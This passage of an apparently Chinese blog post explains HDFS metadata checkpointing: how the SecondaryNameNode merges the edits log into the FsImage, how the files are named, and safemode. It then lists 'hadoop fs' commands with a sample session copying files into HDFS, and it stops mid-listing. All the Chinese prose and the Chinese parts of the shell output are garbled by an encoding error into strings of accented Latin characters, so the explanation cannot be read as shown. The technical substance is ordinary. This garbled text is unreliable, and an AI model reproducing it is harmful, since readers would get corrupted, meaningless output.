<p>é¦–å…ˆå¯ä»¥çœ‹å‡ºï¼Œé™¤äº†NameNodeèŠ‚ç‚¹å¤–ï¼Œä¸ºäº†è¿›è¡Œåˆå¹¶ï¼Œè¿˜å¼•å…¥äº†å¦ä¸€ä¸ªSecondaryNameNodeèŠ‚ç‚¹ã€‚SecondaryNameNodeæ˜¯HDFSæ¶æ„ä¸­çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå®ƒæ˜¯ç”¨æ¥ä¿å­˜Namenodeä¸­å¯¹HDFS metadataçš„ä¿¡æ¯çš„å¤‡ä»½è€Œè®¾å®šçš„ã€‚ä¸€èˆ¬éƒ½æ˜¯å°†SecondaryNamenodeå•ç‹¬è¿è¡Œåœ¨ä¸€å°æœºå™¨ä¸Šã€‚</p>
<p>è¯¦ç»†æµç¨‹ä»‹ç»å¦‚ä¸‹ï¼š <strong>é¦–å…ˆé»‘è‰²å­—ä½“ä»£è¡¨çš„æµç¨‹è¡¨ç¤ºNameNodeè‡ªèº«å¯åŠ¨å’Œè¿è¡Œæ—¶çš„æµç¨‹ï¼Œä¸‹é¢æ¯ä¸ªåºå·å¯¹åº”å›¾ä¸­æµç¨‹ã€‚</strong></p>
<p> 1ï¼‰ç¨‹åºå¯åŠ¨æ—¶ï¼Œéœ€è¦å¯¹å…ƒæ•°æ®è¿›è¡Œæ¢å¤ã€‚æ ¹æ®ä¸Šè¿°å¯¹FsImageå’Œeditsæ–‡ä»¶çš„å·²ç»çŸ¥é“ï¼ŒHDFSé¦–å…ˆå°†Fsimageè¯»å…¥å†…å­˜å¯¹å…ƒæ•°æ®è¿›è¡Œæ¢å¤ï¼Œç„¶åå†è¯»editsæ–‡ä»¶ä¸­çš„æ›´æ–°æ“ä½œåœ¨æ¢å¤åçš„å…ƒæ•°æ®ä¸Šè¿›è¡Œæ‰§è¡Œï¼Œä½¿å¾—æ­¤æ—¶çš„NameNodeä¸­ä¿å­˜çš„æ˜¯åœæ­¢å‰çš„æœ€æ–°çŠ¶æ€ã€‚ </p>
<p>2ã€3ï¼‰å½“æœ‰å®¢æˆ·ç«¯æ‰§è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œæ—¶ï¼ŒHDFSä¼šè®°å½•å…¶ä¸­çš„å¢åˆ æ”¹æ“ä½œåˆ°editsæ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±é¿å…äº†ç›´æ¥å¯¹Fsimageæ–‡ä»¶çš„IOæ“ä½œã€‚ </p>
<ol start="4">
<li>å†…å­˜ä¸­ä¿å­˜çš„å…ƒæ•°æ®æ‰§è¡Œå®¢æˆ·ç«¯çš„å¢åˆ æ”¹æŸ¥æ“ä½œã€‚ï¼ˆFsImageåœ¨æ­¤é˜¶æ®µæ˜¯ä¸æ”¹å˜çš„ï¼‰</li>
</ol>
<p><strong>ç²‰è‰²å­—ä½“ä»£è¡¨çš„æµç¨‹è¡¨ç¤ºSecondaryNameNodeå¯¹æ–‡ä»¶çš„åˆå¹¶æµç¨‹ï¼Œä¸‹é¢æ¯ä¸ªåºå·å¯¹åº”å›¾ä¸­æµç¨‹ã€‚</strong> </p>
<p>1ï¼‰SecondaryNameNodeå‘NameNodeå‘é€è¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦éœ€è¦è¿›è¡Œåˆå¹¶ã€‚åœ¨Hadoopä¸­é€šè¿‡ä¸¤ä¸ªç»´åº¦æ¥æ§åˆ¶æ˜¯å¦éœ€è¦Checkpointï¼Œå¦‚å›¾ä¸­æ‰€ç¤ºï¼š1) åˆ°å®šæ—¶æ—¶é—´ 2) Editsæ–‡ä»¶æ˜¯å¦æ»¡æˆ–è¶…è¿‡äº†è®¾å®šçš„å¤§å°èŒƒå›´ã€‚</p>
<p>2ï¼‰å¦‚æœæ»¡è¶³ä¸Šé¢çš„è§¦å‘æ¡ä»¶ï¼Œåˆ™å¼€å§‹ä¸‹è¿°æ‰§è¡Œåˆå¹¶æµç¨‹ã€‚ </p>
<p>3ã€4ï¼‰ç”±äºNameNodeéœ€è¦å°†æ­¤æ—¶çš„editsæ–‡ä»¶å’ŒFsImageæ–‡ä»¶å‘é€åˆ°SecondaryNamenodeï¼Œæ‰€ä»¥åœ¨NameNodeèŠ‚ç‚¹ä¸Šéœ€è¦åœæ­¢ä½¿ç”¨è¯¥editsæ–‡ä»¶ï¼Œæš‚æ—¶å°†æ–°çš„å†™æ“ä½œå†™åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶æ¯”å¦‚edits_inprogress_002ä¸­ï¼Œè€Œå°†åŸå…ˆçš„edits_inprogress_001é‡å‘½åä¸ºesits_001è¿›è¡Œå‘é€ã€‚è¿™æ ·ï¼Œæœ‰inprogressæ ‡è¯†çš„editsè¡¨ç¤ºæœ€æ–°æ­£åœ¨å†™å…¥æ›´æ–°æ“ä½œçš„æ–‡ä»¶ï¼Œè€Œæ²¡æœ‰è¯¥æ ‡è¯†ï¼Œä¸”åé¢æ•°å­—æœ€å¤§çš„editsæ–‡ä»¶ï¼Œå³è¡¨ç¤ºæœ€åä¸€ä¸ªå·²ç»åˆå¹¶çš„æ–‡ä»¶ã€‚æ¯”å¦‚åœ¨å®é™…çš„æ–‡ä»¶å¤¹ä¸‹ä¼šç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105511.jpg" alt="img"></p>
<p>å„æ–‡ä»¶åçš„å«ä¹‰å³å¦‚ä¸Šæ‰€è¿°ã€‚</p>
<p>5ï¼‰SecondaryNamenodeé€šè¿‡HTTP GETæ–¹å¼ä»NameNodeä¸Šè·å–åˆ°fsimageå’Œeditsæ–‡ä»¶ï¼Œå¹¶ä¸‹è½½åˆ°æœ¬åœ°çš„ç›¸åº”ç›®å½•ä¸‹ã€‚ç„¶åï¼ŒSecondaryNameNodeå°†ä¸‹è½½ä¸‹æ¥çš„fsimageè½½å…¥å†…å­˜ï¼Œç„¶åä¸€æ¡ä¸€æ¡åœ°æ‰§è¡Œeditsæ–‡ä»¶ä¸­çš„å„é¡¹æ›´æ–°æ“ä½œï¼Œä½¿å¾—å†…å­˜ä¸­çš„fsimageä¿å­˜æœ€æ–°ï¼›<strong>è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯editså’Œfsimageæ–‡ä»¶çš„åˆå¹¶ã€‚</strong>ï¼ˆæ˜¯ä¸æ˜¯è·Ÿæˆ‘ä»¬ä¸Šé¢è¯´çš„åœ¨NameNodeå¯åŠ¨æ—¶çš„è½½å…¥è¿‡ç¨‹å¾ˆåƒã€‚HDFSå°±æ˜¯åˆ©ç”¨äº†å¦ä¸€å°æœºå™¨çš„èµ„æºæ¥å¯¹FsImageè¿›è¡Œæ›´æ–°ï¼Œè¿™æ ·NameNodeæ‰€åœ¨èŠ‚ç‚¹çš„èµ„æºå°±åªä¸“æ³¨å“åº”å¯¹å®¢æˆ·ç«¯çš„æ“ä½œï¼‰ã€‚</p>
<p>6ï¼‰ç»è¿‡åˆå¹¶é˜¶æ®µä¹‹åï¼ŒFsImageçš„å†…å®¹å³è¿›è¡Œäº†æ›´æ–°ï¼Œæ­¤æ—¶å¹¶ä¸ä¸NameNodeä¸­çš„å…ƒæ•°æ®å†…å®¹ä¸€è‡´ï¼Œç›¸å·®çš„ä»ç„¶æ˜¯edits_inprogress_002ä¸­å†™å…¥çš„æ›´æ–°æ“ä½œã€‚</p>
<p>7ã€8ï¼‰SecondaryNameNodeä¼šé€šè¿‡postæ–¹å¼å°†æ–°çš„FsImageæ–‡ä»¶å‘é€åˆ°NameNodeèŠ‚ç‚¹ä¸Šã€‚NameNodeå°†æ¥æ”¶åˆ°çš„æ–°çš„fsimageæ›¿æ¢æ—§çš„fsimageæ–‡ä»¶ï¼ŒåŒæ—¶å°†edit_inprogress_002æ–‡ä»¶æ¥è®°å½•åˆå¹¶åç»­çš„æ›´æ–°æ“ä½œã€‚é€šè¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œeditså°±å˜å°äº†ã€‚</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>é€šè¿‡ä¸Šé¢çš„æè¿°å¯ä»¥æ€»ç»“å‡ ç‚¹ã€‚</p>
<ol>
<li>ä¸ºäº†è§£å†³å…ƒæ•°æ®å¤‡ä»½çš„é—®é¢˜ï¼ŒHDFSé‡‡ç”¨äº†edits+FsImageçš„ç­–ç•¥ï¼Œeditsæ–‡ä»¶ä¿å­˜äº†å®¢æˆ·ç«¯çš„æ›´æ–°æ“ä½œï¼ŒFsimageä¿å­˜äº†å…ƒæ•°æ®çš„å…·ä½“å†…å®¹ã€‚HDFSåœ¨è¿è¡Œæ—¶å°†å®¢æˆ·ç«¯çš„æ“ä½œå“åº”åœ¨å†…å®¹ä¸­çš„å…ƒæ•°æ®ä¸Šï¼ŒåŒæ—¶å°†æ‰€æœ‰çš„æ›´æ–°æ“ä½œå†™å…¥editsæ–‡ä»¶ï¼Œé¿å…äº†ç›´æ¥å¯¹FsImageè¿›è¡Œæ“ä½œé€ æˆæ•ˆç‡é™ä½</li>
<li>HDFSä¸ºäº†è§£å†³editsä¸æ–­è¿½åŠ å†™å…¥è¿‡å¤§çš„é—®é¢˜ï¼Œé‡‡ç”¨äº†editsä¸FsImageåˆå¹¶çš„ç­–ç•¥ã€‚å³editsæ–‡ä»¶ä¸æ˜¯ä¸€ç›´åœ¨åŸæ–‡ä»¶ä¸­è¿›è¡Œå†™å…¥çš„ï¼Œè€Œæ˜¯åœ¨ä¸€å®šæ—¶é—´æˆ–è€…æ¡ä»¶åï¼Œå°±æŠŠè¯¥æ—¶é—´æ®µå†…å®¢æˆ·ç«¯çš„æ›´æ–°æ“ä½œåŒæ­¥åˆ°FsImageæ–‡ä»¶ä¸­ï¼Œæ¥æ›´æ–°FsImageæ–‡ä»¶çš„å†…å®¹ã€‚è¿™æ ·ï¼Œæ–°çš„editsæ–‡ä»¶å°±å¯ä»¥åªè®°å½•åˆå¹¶ä¹‹åçš„æ›´æ–°æ“ä½œï¼Œä»è€Œå‡å°äº†editsæ–‡ä»¶çš„å¤§å°ã€‚</li>
<li>HDFSé€šè¿‡å¼•å…¥SecondaryNameNodeæ¥å®ç°ä¸Šè¿°è¿‡ç¨‹ï¼Œåˆ©ç”¨äº†ä¸€å°ç‹¬ç«‹çš„æœºå™¨èµ„æºæ¥å¤„ç†åˆå¹¶æµç¨‹ã€‚æ‰€è°“editsä¸FsImageçš„åˆå¹¶ï¼Œå…¶å®å°±æ˜¯åœ¨SecondaryNamenodeå†…å­˜ä¸­ï¼Œå°†editsä¸­è®°å½•ä¸€æ¡ä¸€æ¡çš„åœ¨fsiamgeä¸­æ‰§è¡Œï¼Œæ¥æ›´æ–°Fsimageçš„å†…å®¹ã€‚åŒæ—¶ï¼Œå¯ä»¥çŸ¥é“ï¼ŒSecondaryNameNodeè·å–åˆ°çš„FsImageä¸æ˜¯æœ€æ–°çš„ï¼Œå› ä¸ºåœ¨å®ƒä»NameNodeä¸‹è½½editså’ŒFsImageæ–‡ä»¶çš„æ—¶å€™ï¼Œæ–°çš„æ›´æ–°æ“ä½œå·²ç»å†™åˆ°æ–°çš„editsæ–‡ä»¶é‡Œå»äº†ï¼ˆæ¯”å¦‚è¿™é‡Œçš„edits_inprogress_002ï¼‰ã€‚è€Œè¿™äº›æ›´æ–°åœ¨SecondaryNamenodeæ˜¯æ²¡æœ‰åŒæ­¥åˆ°çš„ã€‚</li>
<li>editså’ŒFsImageåˆ©ç”¨äº†æ–‡ä»¶å‘½åæ ¼å¼æ¥æ ‡è¯†å„è‡ªçš„æœ€æ–°æ–‡ä»¶ã€‚å¦‚fsiamgeå’Œeditsæ–‡ä»¶å›¾ä¸­æ‰€ç¤ºï¼Œeditsæ–‡ä»¶ä»¥edits_å¼€å¤´ï¼Œåé¢è·Ÿä¸€ä¸ªtxidèŒƒå›´ç«¯ï¼Œå¹¶ä¸”å¤šä¸ªedit logä¹‹é—´é¦–å°¾ç›¸è¿ï¼Œæ­£åœ¨ä½¿ç”¨çš„editsæ–‡ä»¶åå­—ä¸ºedits_inprogress_txidã€‚è¯¥è·¯å¾„ä¸‹è¿˜ä¼šä¿å­˜ä¸¤ä¸ªFsImageæ–‡ä»¶ï¼ˆ<code>dfs.namenode.num.checkpoints.retained</code>åœ¨namenodeä¸Šä¿å­˜çš„fsimageä¸ªæ•°çš„é»˜è®¤é…ç½®ï¼Œè¶…è¿‡çš„è¢«åˆ é™¤ï¼Œé»˜è®¤ä¿å­˜ä¸¤ä¸ªï¼‰ã€‚æ–‡ä»¶æ ¼å¼ä¸ºfsimage_txidï¼Œtxidä¸editsä¸­çš„txidå¯¹åº”ï¼Œè¡¨ç¤ºè¯¥fsimageåŠ è½½çš„æ˜¯å“ªä¸€ä¸ªeditsã€‚æ¯”å¦‚ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶çš„fsimageå·²ç»åŠ è½½åˆ°å°¾æ•°ä¸º1545çš„editsæ–‡ä»¶å†…å®¹</li>
</ol>
<h4 id="å…¶å®ƒè¡¥å……"><a href="#å…¶å®ƒè¡¥å……" class="headerlink" title="å…¶å®ƒè¡¥å……"></a>å…¶å®ƒè¡¥å……</h4><p>å®é™…æŸ¥çœ‹FsImageæ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œå¯ä»¥å‘ç°Fsimageä¸­æ˜¯æ²¡æœ‰è®°å½•å—æ‰€å¯¹åº”DataNodeçš„ã€‚æ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105313.jpg" alt="img"></p>
<p>åœ¨å†…å­˜å…ƒæ•°æ®ä¸­æ˜¯æœ‰è®°å½•å—æ‰€å¯¹åº”çš„datanodeä¿¡æ¯ï¼Œä½†æ˜¯fsimageä¸­å°±å‰”é™¤äº†è¿™ä¸ªä¿¡æ¯ï¼›HDFSé›†ç¾¤åœ¨å¯åŠ¨çš„æ—¶å€™ä¼šåŠ è½½imageä»¥åŠeditsæ–‡ä»¶ï¼Œblockå¯¹åº”çš„dnä¿¡æ¯éƒ½æ²¡æœ‰è®°å½•ï¼Œé›†ç¾¤å¯åŠ¨æ—¶ä¼šæœ‰ä¸€ä¸ªå®‰å…¨æ¨¡å¼ï¼ˆsafemodeï¼‰,å®‰å…¨æ¨¡å¼å°±æ˜¯ä¸ºäº†è®©datanodeæ±‡æŠ¥è‡ªå·±å½“å‰æ‰€æŒæœ‰çš„blockä¿¡æ¯ç»™nnæ¥è¡¥å…¨å…ƒæ•°æ®ã€‚åç»­æ¯éš”ä¸€æ®µæ—¶é—´datanodeéƒ½è¦æ±‡æŠ¥è‡ªå·±æŒæœ‰çš„blockä¿¡æ¯ã€‚å› ä¸ºå³ä½¿fsimageä¸­è®°å½•äº†datanodeä¿¡æ¯ï¼Œä½†æ˜¯åœ¨æ¢å¤å…ƒæ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½æŸäº›datanodeèŠ‚ç‚¹å‡ºç°äº†é—®é¢˜ã€‚æ‰€ä»¥ï¼Œå…¶å®æ— è®ºFsImageä¸­æ˜¯å¦å¯¹blockçš„dnä¿¡æ¯è¿›è¡Œäº†è®°å½•ï¼Œæ¢å¤çš„æ—¶å€™éƒ½æ˜¯éœ€è¦dnæ¥æ±‡æŠ¥è‡ªå·±æŒæœ‰çš„blockä¿¡æ¯ï¼Œè¿™æ ·æ‰æ˜¯æœ€çœŸå®å’Œå®‰å…¨çš„ã€‚</p>
<h2 id="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"><a href="#äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ" class="headerlink" title="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"></a>äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ</h2><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><p>hadoop fs å…·ä½“å‘½ä»¤ OR hdfs dfs å…·ä½“å‘½ä»¤</p>
<p>ä¸¤ä¸ªæ˜¯å®Œå…¨ç›¸åŒçš„ã€‚</p>
<h3 id="å‘½ä»¤å¤§å…¨"><a href="#å‘½ä»¤å¤§å…¨" class="headerlink" title="å‘½ä»¤å¤§å…¨"></a>å‘½ä»¤å¤§å…¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs</span><br><span class="line">Usage: hadoop fs [generic options]</span><br><span class="line">	[-appendToFile &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-cat [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-checksum &lt;src&gt; ...]</span><br><span class="line">	[-chgrp [-R] GROUP PATH...]</span><br><span class="line">	[-chmod [-R] &lt;MODE[,MODE]... | OCTALMODE&gt; PATH...]</span><br><span class="line">	[-chown [-R] [OWNER][:[GROUP]] PATH...]</span><br><span class="line">	[-copyFromLocal [-f] [-p] [-l] [-d] [-t &lt;thread count&gt;] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-copyToLocal [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-count [-q] [-h] [-v] [-t [&lt;storage type&gt;]] [-u] [-x] [-e] &lt;path&gt; ...]</span><br><span class="line">	[-cp [-f] [-p | -p[topax]] [-d] &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-createSnapshot &lt;snapshotDir&gt; [&lt;snapshotName&gt;]]</span><br><span class="line">	[-deleteSnapshot &lt;snapshotDir&gt; &lt;snapshotName&gt;]</span><br><span class="line">	[-df [-h] [&lt;path&gt; ...]]</span><br><span class="line">	[-du [-s] [-h] [-v] [-x] &lt;path&gt; ...]</span><br><span class="line">	[-expunge]</span><br><span class="line">	[-find &lt;path&gt; ... &lt;expression&gt; ...]</span><br><span class="line">	[-get [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-getfacl [-R] &lt;path&gt;]</span><br><span class="line">	[-getfattr [-R] &#123;-n name | -d&#125; [-e en] &lt;path&gt;]</span><br><span class="line">	[-getmerge [-nl] [-skip-empty-file] &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-head &lt;file&gt;]</span><br><span class="line">	[-help [cmd ...]]</span><br><span class="line">	[-ls [-C] [-d] [-h] [-q] [-R] [-t] [-S] [-r] [-u] [-e] [&lt;path&gt; ...]]</span><br><span class="line">	[-mkdir [-p] &lt;path&gt; ...]</span><br><span class="line">	[-moveFromLocal &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-moveToLocal &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-mv &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-put [-f] [-p] [-l] [-d] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-renameSnapshot &lt;snapshotDir&gt; &lt;oldName&gt; &lt;newName&gt;]</span><br><span class="line">	[-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ...]</span><br><span class="line">	[-rmdir [--ignore-fail-on-non-empty] &lt;dir&gt; ...]</span><br><span class="line">	[-setfacl [-R] [&#123;-b|-k&#125; &#123;-m|-x &lt;acl_spec&gt;&#125; &lt;path&gt;]|[--set &lt;acl_spec&gt; &lt;path&gt;]]</span><br><span class="line">	[-setfattr &#123;-n name [-v value] | -x name&#125; &lt;path&gt;]</span><br><span class="line">	[-setrep [-R] [-w] &lt;rep&gt; &lt;path&gt; ...]</span><br><span class="line">	[-stat [format] &lt;path&gt; ...]</span><br><span class="line">	[-tail [-f] [-s &lt;sleep interval&gt;] &lt;file&gt;]</span><br><span class="line">	[-test -[defsz] &lt;path&gt;]</span><br><span class="line">	[-text [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-touch [-a] [-m] [-t TIMESTAMP ] [-c] &lt;path&gt; ...]</span><br><span class="line">	[-touchz &lt;path&gt; ...]</span><br><span class="line">	[-truncate [-w] &lt;length&gt; &lt;path&gt; ...]</span><br><span class="line">	[-usage [cmd ...]]</span><br><span class="line"></span><br><span class="line">Generic options supported are:</span><br><span class="line">-conf &lt;configuration file&gt;        specify an application configuration file</span><br><span class="line">-D &lt;property=value&gt;               define a value for a given property</span><br><span class="line">-fs &lt;file:///|hdfs://namenode:port&gt; specify default filesystem URL to use, overrides &#x27;fs.defaultFS&#x27; property from configurations.</span><br><span class="line">-jt &lt;local|resourcemanager:port&gt;  specify a ResourceManager</span><br><span class="line">-files &lt;file1,...&gt;                specify a comma-separated list of files to be copied to the map reduce cluster</span><br><span class="line">-libjars &lt;jar1,...&gt;               specify a comma-separated list of jar files to be included in the classpath</span><br><span class="line">-archives &lt;archive1,...&gt;          specify a comma-separated list of archives to be unarchived on the compute machines</span><br><span class="line"></span><br><span class="line">The general command line syntax is:</span><br><span class="line">command [genericOptions] [commandOptions]</span><br></pre></td></tr></table></figure>

<h3 id="å¸¸è§æ“ä½œ"><a href="#å¸¸è§æ“ä½œ" class="headerlink" title="å¸¸è§æ“ä½œ"></a>å¸¸è§æ“ä½œ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">help</span> è¾“å‡ºè¿™ä¸ªå‘½ä»¤çš„å‚æ•°</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -help rm</span><br><span class="line">-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ... :</span><br><span class="line">  Delete all files that match the specified file pattern. Equivalent to the Unix</span><br><span class="line">  command &quot;rm &lt;src&gt;&quot;</span><br><span class="line">                                                                                 </span><br><span class="line">  -f          If the file does not exist, do not display a diagnostic message or </span><br><span class="line">              modify the exit status to reflect an error.                        </span><br><span class="line">  -[rR]       Recursively deletes directories.                                   </span><br><span class="line">  -skipTrash  option bypasses trash, if enabled, and immediately deletes &lt;src&gt;.  </span><br><span class="line">  -safely     option requires safety confirmation, if enabled, requires          </span><br><span class="line">              confirmation before deleting large directory with more than        </span><br><span class="line">              &lt;hadoop.shell.delete.limit.num.files&gt; files. Delay is expected when</span><br><span class="line">              walking over large directory recursively to count the number of    </span><br><span class="line">              files to be deleted before the confirmation. </span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mkdir</span> æ–°å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -mkdir /sanguo</span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-moveFromLocal ä»æœ¬åœ°å‰ªåˆ‡ç²˜è´´åˆ°HDFS</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -moveFromLocal ./shuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:55:50,370 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 212</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6æœˆ  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6æœˆ  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6æœˆ  28 12:13 wcinput</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi weiguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-copyFromLocal ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæ‹·è´åˆ°HDFSè·¯å¾„å»</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyFromLocal ./weiguo.txt /sanguo</span><br><span class="line">2021-06-30 13:57:22,614 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 216</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6æœˆ  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6æœˆ  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6æœˆ  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6æœˆ  30 13:56 weiguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-put ç­‰åŒäºcopyFromLocalï¼Œç”Ÿäº§ç¯å¢ƒæ›´ä¹ æƒ¯ç”¨put</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -put ./wuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:58:16,277 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi liubei.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-appendFile è¿½åŠ ä¸€ä¸ªæ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„æ–‡ä»¶æœ«å°¾</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -appendToFile ./liubei.txt /sanguo/shuguo.txt</span><br><span class="line">2021-06-30 14:00:23,765 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-copyToLocal ä»HDFSæ‹·è´åˆ°æœ¬åœ°</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyToLocal /sanguo/shuguo.txt ./</span><br><span class="line">2021-06-30 14:01:16,117 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">æ€»ç”¨é‡ 228</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6æœˆ  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9æœˆ  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9æœˆ   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6æœˆ  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6æœˆ  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9æœˆ   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9æœˆ   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9æœˆ  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9æœˆ  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6æœˆ  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang 